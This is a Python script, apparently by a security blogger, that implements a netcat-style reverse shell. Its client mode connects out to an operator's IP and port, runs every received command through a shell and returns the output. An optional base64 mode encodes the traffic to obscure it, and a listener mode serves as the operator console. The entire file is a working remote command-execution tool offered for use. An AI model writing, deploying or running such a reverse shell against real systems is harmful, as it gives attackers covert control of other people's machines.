#-*- coding:utf-8 -*-
# @Time    : 2020-05-21 16:18
# @Author  : nice0e3
# @FileName: python_nc
# @Software: PyCharm
# @Blog    ：https://www.cnblogs.com/nice0e3/
import subprocess
import socket
import argparse
import base64


class No_socket_nc(object):
    def __init__(self,ip,prot,listen,encode):
        self.ip =     ip
        self.prot =   prot
        self.listen = listen
        self.encode = encode
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s = s

    def no_socket_server(self):
        self.s.bind(('',self.listen))
        self.s.listen(128)
        print('Waiting for a connection')
        recv_data, addr = self.s.accept()
        print('Successful connection%s' % str(addr))
        while True:
            command = input('$>')
            recv_data.send(command.encode())
            output = recv_data.recv(4096)
            print(output.decode('GBK'))

    def no_socket_client(self):
        try:
            self.s.connect((self.ip,int(self.prot)))
        except Exception as e:
            print(e)
        else:
            while True:
                self.data = self.s.recv(4096)
                self.command = self.data.decode()
                self.command = self.command.strip()
                if self.command == 'exit':
                    break
                else:
                    res = subprocess.Popen(self.command,
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    res.wait()
                    command_output, error_output = res.communicate()
                    if error_output.decode('GBK'):
                        self.s.send(error_output)
                    else:
                        self.s.send(command_output)
                '''
                def command():
                    command = input('$>')
                    res=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    
                    command_output,error_output= res.communicate()
                    if error_output.decode('GBK'):
                        print(error_output.decode('GBK'))
                    else:
                        print(command_output.decode('GBK'))'''



class Base64_nc(No_socket_nc):
    def no_socket_server(self):
        self.s.bind(('', self.listen))
        self.s.listen(128)
        print('Waiting for a connection')
        recv_data, addr = self.s.accept()
        print('Successful connection%s' % str(addr))
        while True:
            command = input('$>')
            command = base64.b64encode(command.encode())
            recv_data.send(command)
            output = recv_data.recv(4096)
            print(base64.b64decode(output).decode('GBK'))


    def no_socket_client(self):
        try:
            self.s.connect((self.ip, int(self.prot)))
        except Exception as e:
            print(e)
        else:

            while True:
                self.data = self.s.recv(4096)
                self.command = self.data.decode()

                self.command =base64.b64decode(self.command).decode('GBK')
                self.command = self.command.strip()
                if self.command == 'exit':
                    break
                else:
                    try:
                        res = subprocess.Popen(self.command,
                                               shell=True,
                                               stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE)
                        res.wait()
                    except Exception as e:
                        print(e)
                    else:
                        command_output, error_output = res.communicate()
                        if error_output.decode('GBK'):
                            error_output = base64.b64encode(error_output)
                            self.s.send(error_output)
                        else:
                            command_output = base64.b64encode(command_output)
                            self.s.send(command_output)





def get_ars():
    parse = argparse.ArgumentParser()
    parse.add_argument('-p', '--port', dest='port', type=int, help='Designated port')
    parse.add_argument('-i', '--ip', dest='ip', type=str, help='Designated ip')
    parse.add_argument('-l', '--listen', dest='listen', type=int, help='Start listening')
    parse.add_argument('-e', '--encode', dest='encode', type=str, help='Specify how to encode')
    args = parse.parse_args()
    return args




def main():
    args = get_ars()
    prot = args.port
    ip = args.ip
    encode = args.encode
    listen = args.listen

    no_socket_nc = No_socket_nc(ip,prot,listen,encode)
    base_nc = Base64_nc(ip, prot, listen, encode)
    if ip and prot and encode == 'base64':
        base_nc.no_socket_client()
    elif listen and encode == 'base64':
        base_nc.no_socket_server()
    elif ip and prot:
        no_socket_nc.no_socket_client()
    elif listen:
        no_socket_nc.no_socket_server()
    # base_nc = Base64_nc(ip, prot, listen, encode)
    # base_nc.no_socket_client()
    # base_nc.no_socket_server()

if __name__ == '__main__':
    main()
